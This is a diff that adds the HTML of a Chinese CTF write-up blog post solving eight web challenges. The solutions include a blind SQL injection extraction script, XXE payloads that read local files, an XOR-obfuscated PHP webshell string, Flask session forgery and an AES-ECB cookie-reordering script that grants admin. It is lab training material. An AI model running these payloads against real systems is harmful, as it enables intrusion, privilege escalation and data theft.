@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BUUOJ-web刷题（五）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/04/29/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&title=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&title=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/&text=BUUOJ-web刷题（五）" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUOJ-web刷题（五）&body=Check out this article: http://yoursite.com/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-PASECA2019-honey-shop"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [PASECA2019]honey_shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-PASECA2019-honey-shop"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [PASECA2019]honey_shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-FireshellCTF2020-Caas"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [FireshellCTF2020]Caas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GoogleCTF2019-Quals-Bnv"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GoogleCTF2019 Quals]Bnv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2019-SVGMagic"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2019]SVGMagic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-CSAWQual-2019-Web-Unagi"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [CSAWQual 2019]Web_Unagi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-ISITDTU-2019-EasyPHP"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [ISITDTU 2019]EasyPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-08-BSidesCF-2019-Mixer"><span class="toc-number">8.</span> <span class="toc-text">0x 08 [BSidesCF 2019]Mixer</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUOJ-web刷题（五）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-28T06:13:59.000Z" itemprop="datePublished">2020-04-28</time>
+        
+        (Updated: <time datetime="2020-05-01T14:58:29.791Z" itemprop="dateModified">2020-05-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-PASECA2019-honey-shop"><a href="#0x-01-PASECA2019-honey-shop" class="headerlink" title="0x 01 [PASECA2019]honey_shop"></a>0x 01 [PASECA2019]honey_shop</h3><ul>
+<li><p>考点</p>
+<p>SQL注入、session机制</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>在templates下的PHP文件都有一句话：<code>!isset($_SESSION) AND die(&quot;Direct access on this script is not allowed!&quot;);</code></p>
+<p>$_SESSION数组在session_start()初始化后才产生。因此我们直接访问templates下的，$_SESSION还不存在。</p>
+<p>与Session相关的另一个选项叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()（具体请参考<a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">这里</a>）。</p>
+<p>本地测试一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.8&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">files &#x3D; &#123;&quot;file&quot;: &quot;123456789&quot;&#125;</span><br><span class="line">a &#x3D; requests.post(url&#x3D;url, files&#x3D;files, data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;123456789&quot;&#125;,</span><br><span class="line">                  cookies&#x3D;&#123;&quot;PHPSESSID&quot;: &quot;test1&quot;&#125;,proxies&#x3D;&#123;&#39;http&#39;: &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
+
+<p>利用代理抓包发现成功执行session_start();</p>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428142152982.png" alt></p>
+<p>在login.php中存在SQL注入，最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">dict &#x3D; &quot;&#123;&#125;-abcdefghijklmnopqrstuvwxyz1234567890&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;67fab014-d40a-4993-ba68-b765f4741a63.node3.buuoj.cn&#x2F;templates&#x2F;login.php&#39;</span><br><span class="line">files &#x3D; &#123;&quot;file&quot;:&quot;123&quot;&#125;</span><br><span class="line">data &#x3D; &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;123&quot;&#125;</span><br><span class="line">cookies &#x3D; &#123;&quot;PHPSESSID&quot;:&quot;123&quot;&#125;</span><br><span class="line"></span><br><span class="line">for b in range(1,42):</span><br><span class="line">    for i in dict:</span><br><span class="line">        params&#x3D;&#123;&quot;username&quot;:&#39;test&quot; or (ascii(substr((select group_concat(secret) from flag_tbl),&#39;+str(b)+&#39;,1))&#x3D;&#39;+str(ord(i))+&#39;)#&#39;,&quot;password&quot;:&quot;test&quot;&#125;</span><br><span class="line">        a &#x3D; requests.post(url&#x3D;url,files&#x3D;files,data&#x3D;data,cookies&#x3D;cookies,params&#x3D;params).text</span><br><span class="line">        if &#39;meta&#39; in a:</span><br><span class="line">            print(i)</span><br><span class="line">            flag +&#x3D; i</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/08/PwnThyBytes-2019-Baby-sql-is-not-baby-anymore/</a></p>
+<p><a href="https://guokeya.github.io/post/N0i4q6Q4f/" target="_blank" rel="noopener">https://guokeya.github.io/post/N0i4q6Q4f/</a></p>
+</blockquote>
+<h3 id="0x-02-PASECA2019-honey-shop"><a href="#0x-02-PASECA2019-honey-shop" class="headerlink" title="0x 02 [PASECA2019]honey_shop"></a>0x 02 [PASECA2019]honey_shop</h3><ul>
+<li><p>考点</p>
+<p>lfi、flasksession安全机制</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>通过图片下载功能本地文件包含读取当前进程的环境变量，获取SECRET_KEY</li>
+</ol>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193139821.png" alt></p>
+<ol start="2">
+<li>解密当前的session，得到<code>&#39;{&quot;balance&quot;:1336,&quot;purchases&quot;:[]}&#39;</code>，修改金额，再次加密购买得到flag</li>
+</ol>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193306847.png" alt></p>
+<p>加解密脚本：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>需要注意的是那个脚本对Python版本有一定的限制，最好是在Python 3.6 Linux下运行。</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/10/19/PASECACTF-2019-Honey-shop/</a></p>
+</blockquote>
+<h3 id="0x-03-FireshellCTF2020-Caas"><a href="#0x-03-FireshellCTF2020-Caas" class="headerlink" title="0x 03 [FireshellCTF2020]Caas"></a>0x 03 [FireshellCTF2020]Caas</h3><ul>
+<li><p>考点</p>
+<p>文件包含</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>题目是输入C语言代码。会给你一个编译好的可执行程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include 命令告诉预处理器将指定头文件的内容插入到预处理器命令的相应位置</span><br></pre></td></tr></table></figure>
+
+<p>通过包含根目录的flag报错来显示文件内容</p>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428193819948.png" alt></p>
+<h3 id="0x-04-GoogleCTF2019-Quals-Bnv"><a href="#0x-04-GoogleCTF2019-Quals-Bnv" class="headerlink" title="0x 04 [GoogleCTF2019 Quals]Bnv"></a>0x 04 [GoogleCTF2019 Quals]Bnv</h3><ul>
+<li><p>考点</p>
+<p>本地XXE</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>ubuntu系统自带<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件</p>
+<p>它定义了很多参数实体并调用,所以我们可以在内部重写一个该dtd文件中含有的参数实体,如<code>ISOmaso</code></p>
+<p>然后在xml中。重写dtd。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#39;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428215857519.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2019/07/14/50.html</a></p>
+</blockquote>
+<h3 id="0x-05-BSidesCF-2019-SVGMagic"><a href="#0x-05-BSidesCF-2019-SVGMagic" class="headerlink" title="0x 05 [BSidesCF 2019]SVGMagic"></a>0x 05 [BSidesCF 2019]SVGMagic</h3><ul>
+<li><p>考点</p>
+<p>xxe</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>svg 其实就是 xml, 所以还是 xxe,读取当前进程中的flag，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200429100043967.png" alt></p>
+<h3 id="0x-06-CSAWQual-2019-Web-Unagi"><a href="#0x-06-CSAWQual-2019-Web-Unagi" class="headerlink" title="0x 06 [CSAWQual 2019]Web_Unagi"></a>0x 06 [CSAWQual 2019]Web_Unagi</h3><ul>
+<li><p>考点</p>
+<p>xxe</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>根据题目提示构造XXEpayload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;&#x2F;username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;&#x2F;password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;&#x2F;name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;&#x2F;email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;&#x2F;group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;</span><br><span class="line">    &lt;&#x2F;user&gt;</span><br><span class="line">&lt;&#x2F;users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是被waf掉了，可以通过编码转换绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 simple.xml&gt;1.xml</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x-07-ISITDTU-2019-EasyPHP"><a href="#0x-07-ISITDTU-2019-EasyPHP" class="headerlink" title="0x 07 [ISITDTU 2019]EasyPHP"></a>0x 07 [ISITDTU 2019]EasyPHP</h3><ul>
+<li><p>考点</p>
+<p>特殊webshell</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>由于php的动态特性，PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p>
+<p>另外还有一点，PHP调用函数，可以使用字符串调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">final_string&#x3D;&quot;phpinfo&quot;</span><br><span class="line">allowed&#x3D;&quot;!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~&quot;</span><br><span class="line">for a in final_string:    </span><br><span class="line">    for i in allowed:</span><br><span class="line">        for p in allowed:</span><br><span class="line">            if ord(i)^ord(p)&#x3D;&#x3D;ord(a):</span><br><span class="line">                print(&quot;i&#x3D;%s p&#x3D;%s a&#x3D;%s&quot;%(i,p,a))</span><br></pre></td></tr></table></figure>
+
+<p>暴力搜索符合条件的字符串，例如：phpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff。</p>
+<p>除了必要的<code>()^;</code>以外，我们最多剩余9个字符的空间，可以通过爆破的方式进行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">result2 &#x3D; [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total</span><br><span class="line">result &#x3D; [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted</span><br><span class="line">temp &#x3D; []</span><br><span class="line">for d in result2:</span><br><span class="line">    for a in result:</span><br><span class="line">        for b in result:</span><br><span class="line">            for c in result:</span><br><span class="line">                if (a ^ b ^ c &#x3D;&#x3D; d):</span><br><span class="line">                    if a &#x3D;&#x3D; b &#x3D;&#x3D; c &#x3D;&#x3D; d:</span><br><span class="line">                        continue</span><br><span class="line">                    else:</span><br><span class="line">                        print(&quot;a&#x3D;0x%x,b&#x3D;0x%x,c&#x3D;0x%x,d&#x3D;0x%x&quot; % (a, b, c, d))</span><br><span class="line">                        if d not in temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>
+
+<p>结果：<code>print_r(scandir(.));==((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></p>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200430232813996.png" alt></p>
+<p>最后payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(end(scandir(.)));&#x3D;&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/</a></p>
+</blockquote>
+<h3 id="0x-08-BSidesCF-2019-Mixer"><a href="#0x-08-BSidesCF-2019-Mixer" class="headerlink" title="0x 08 [BSidesCF 2019]Mixer"></a>0x 08 [BSidesCF 2019]Mixer</h3><ul>
+<li><p>考点</p>
+<p>AES 的 ECB 翻转攻击</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<p>burp设置跟随重定向  </p>
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200501225143645.png" alt></p>
+<p>根据题目的提示修改cookie发现报错，得到原文信息大致为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;xxx&quot;,&quot;last_name&quot;:&quot;xxx&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以推测是 ECB 加密, 如果是 CBC 的话, 前面也会变成乱码,我们知道 ECB 加密是 16 位一组, 并且每组互相独立, 加密后为 32 位,而这里的目标是让<code>is_admin</code>变成 1, 单纯的翻转的话不太好操作, 毕竟我们不知道 IV.json有个特性：<code>1.0 = 1</code></p>
+<p>那么我们尝试构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;p</span><br><span class="line">aww&quot;,&quot;is_admin&quot;:</span><br><span class="line">0&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以分为5块，而加密后是以16进制表示的，所以我们需要的第二块就在<code>32-64</code>，我们把这块加在倒数第二块。第二块的值为<code>1.00000000000000</code>最后一块为0}，所以结合起来就是<code>1.000000000000000}</code>，再与之前的结合.整体就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;paww&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c40cb849-de86-41c4-9b19-74e70fb66483.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">action &#x3D; &quot;&quot;&quot;?action&#x3D;login&amp;first_name&#x3D;A1.00000000000000&amp;last_name&#x3D;paww&quot;&quot;&quot;</span><br><span class="line">r &#x3D; requests.get(url + action, verify&#x3D;False, allow_redirects&#x3D;False) #取消认证和禁止重定向</span><br><span class="line">for c in r.cookies:</span><br><span class="line">    print(c.name, c.value)</span><br><span class="line">    if c.name &#x3D;&#x3D; &quot;user&quot;:</span><br><span class="line">        c.value &#x3D; c.value[:-32] + c.value[32:64] + c.value[-32:]</span><br><span class="line"></span><br><span class="line">resp &#x3D; requests.get(url, cookies&#x3D;r.cookies, verify&#x3D;False, allow_redirects&#x3D;False)</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure>
+
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://cjm00n.top/CTF/Buu刷题记录3.html#BSidesCF-2019-Pick-Tac-Toe" target="_blank" rel="noopener">https://cjm00n.top/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html#BSidesCF-2019-Pick-Tac-Toe</a></p>
+<p><a href="https://blog.csdn.net/a3320315/article/details/104335989" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104335989</a></p>
+</blockquote>
+<p><a href="https://guokeya.github.io/post/Y59x961oO/" target="_blank" rel="noopener">https://guokeya.github.io/post/Y59x961oO/</a></p>
+<p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;\&amp;password&#x3D;||1 group by token with rollup having token is NULL--+&amp;question&#x3D;1</span><br><span class="line"></span><br><span class="line">I_am_password_8e7y3262ye9h3sdu2hs9qw</span><br><span class="line">I_am_flag2ijwy2w7892yw2uowh2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/28/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%BA%94%EF%BC%89/image-20200428205315835.png" alt></p>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
